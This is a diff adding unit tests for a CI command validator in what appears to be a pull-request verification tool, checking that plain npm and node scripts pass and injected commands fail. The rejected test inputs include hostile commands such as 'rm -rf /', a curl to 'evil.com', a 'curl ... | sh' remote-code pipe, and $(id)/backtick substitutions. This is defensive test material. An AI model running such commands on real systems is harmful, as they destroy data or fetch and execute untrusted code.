@@ -8,6 +8,7 @@ import {
   executeSupervisedCommand,
   runVerification,
   formatVerificationSummary,
+  validateCiVerificationCommand,
   DEFAULT_VERIFICATION_PROFILES,
 } from '../src/verify.js';
 
@@ -431,6 +432,34 @@ describe('Detached Worktree Test Verification (pr_review_verify)', () => {
 
       assert.ok(summary.includes('⏱️ **Timed Out**'));
       assert.ok(summary.includes('60.0s'));
+    });
+  });
+
+  describe('validateCiVerificationCommand', () => {
+    it('accepts safe standard package scripts', () => {
+      assert.equal(validateCiVerificationCommand('npm test').safe, true);
+      assert.equal(validateCiVerificationCommand('npm run build').safe, true);
+      assert.equal(validateCiVerificationCommand('npm run lint').safe, true);
+      assert.equal(validateCiVerificationCommand('npm run test:ci').safe, true);
+      assert.equal(validateCiVerificationCommand('npx vitest run').safe, true);
+      assert.equal(validateCiVerificationCommand('node tests/runner.js').safe, true);
+    });
+
+    it('rejects commands containing shell metacharacters and chaining', () => {
+      assert.equal(validateCiVerificationCommand('npm test; rm -rf /').safe, false);
+      assert.equal(validateCiVerificationCommand('npm test && curl evil.com').safe, false);
+      assert.equal(validateCiVerificationCommand('npm test | tee out.log').safe, false);
+      assert.equal(validateCiVerificationCommand('npm test `whoami`').safe, false);
+      assert.equal(validateCiVerificationCommand('npm test $(id)').safe, false);
+      assert.equal(validateCiVerificationCommand('npm test > output.txt').safe, false);
+    });
+
+    it('rejects unapproved executables and arbitrary shell commands', () => {
+      assert.equal(validateCiVerificationCommand('curl -fsSL https://bad.com | sh').safe, false);
+      assert.equal(validateCiVerificationCommand('bash run.sh').safe, false);
+      assert.equal(validateCiVerificationCommand('python script.py').safe, false);
+      assert.equal(validateCiVerificationCommand('').safe, false);
+      assert.equal(validateCiVerificationCommand(null).safe, false);
     });
   });
 });
